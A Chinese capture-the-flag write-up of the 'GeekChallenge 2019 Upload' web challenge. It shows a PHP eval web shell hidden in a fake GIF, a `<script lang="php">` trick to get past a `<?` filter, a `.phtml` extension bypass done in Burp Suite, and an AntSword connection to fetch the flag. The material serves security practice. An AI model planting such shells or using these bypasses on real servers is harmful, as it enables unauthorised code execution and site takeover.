---
title: 极客大挑战 2019 Upload
date: 2023-10-24
categories:
  - CTF
  - Web
---

## 前置工作

打开靶机，看到的就是如此简简单单的文件上传入口，通常这种文件上传的就应该想到**一句话木马**，然后使用**蚁剑**获得靶机的操控权

![](https://p.sda1.dev/13/bb15d8379c77045d0f53ae2a835ae7b8/image.png)

通常我们会这么写一句话木马

```php
  <?php @eval($_POST['蚁剑连接密码']);?>
```

网页的标题名字叫`上传头像`，说明我最好伪造一个图片文件，把木马植入进去

## 图片木马

为什么要伪造 GIF 作为木马图片，因为文件头是固定的，如果你的文件头是 `GIF89a?`，那么你就是一张 GIF 图片（不论你后面跟着的是什么），所以我们就用最简单的方法制作一个 GIF 图片木马，以下是 `a.gif` 的代码

```php
GIF89a?
<?php @eval($_POST['attack']);?>
```

随后我们上传 `a.gif`，发现报错 `NO! HACKER! your file included '<?'`，说明他检测到了我木马文件中的 `<?php` 字段，那么我现在希望的是能绕过这个检测，这就需要 PHP 的另一种写法了

![](https://p.sda1.dev/13/cd365affb109724c4c785c059f3db2fa/image.png)

## 木马改进

除了使用 `<?php ?>` 的方式声明 PHP 代码，我们还能够使用传统的 JS 脚本声明方法，即 `<script lang="php"></script>`，这就能够绕过 `<?php` 的检测，以下是改进后的木马

```php
GIF89a?
<script lang="php">
    @eval($_POST['attack']);
</script>
```

我们把改进后的 `a.gif` 上传，发现上传已完成，但是 `.gif` 的格式摆脱不了被当成图片处理的本质，我们需要对后缀进行更改

![](https://p.sda1.dev/13/4235037389767da5dc5413f31a3e8b7a/image.png)

## 后缀更改

我们使用 Burp Suite 进行第二次上传，使用拦截模式提供的内嵌浏览器，将刚才的 `a.gif` 再一次上传，此时查看 Burp Suite 发现已经将 Http 请求拦截下来了

![](https://p.sda1.dev/13/abe920c6faaf9362e8497c31e8a05067/image.png)

在第 16 行有一个 `filename="a.gif"` ，我们直接点，把 `.gif` 改成 `.php`，并放行，发现报错

![](https://p.sda1.dev/13/ab210ba8d1012b18d62f1dd45eebfb0b/image.png)

说明我们不能很单纯地使用 `.php` 后缀，但是实际上不仅仅有 `.php` 后缀的文件才能被执行，我们可以使用变式后缀，例如 `.phtml`，打开的时候也会被当成 PHP 文件执行，于是我们更改 `filename="a.phtml"`，再次放行

![](https://p.sda1.dev/13/29d4bc4b071bb1912322896834a60496/image.png)

## 攻入靶机

发现文件已经成功上传，我们猜测保存在根目录，尝试访问 `/a.phtml`，发现不存在，再次猜测保存在 `/upload` 目录，尝试访问 `/upload/a.phtml`，发现能够访问，但是除了第一行的 `GIF89a?` 之外没有任何内容，此时是正常情况，我们已经可以利用蚁剑进行连接了，我们打开蚁剑，右键添加数据，按照如下图所示填写内容，连接密码即在一句话木马中，随后点击测试连接，提示连接成功，点击添加即可

![](https://p.sda1.dev/13/c06ea551e002ae398d235a923581fce2/image.png)

随后如下页面右键选择文件管理

![](https://p.sda1.dev/13/6d4407c792a5b3622afca08488f6bee7/image.png)

进入后直接往根目录去看，拉到底一下就发现了 `flag` 文件

![](https://p.sda1.dev/13/bb24c5cdb9de05545880c455bdf5c470/image.png)

点开就能看到 Flag 了，最终结果为 `flag{8cf43e2c-bfc7-4900-80d7-900ff5512f1a}`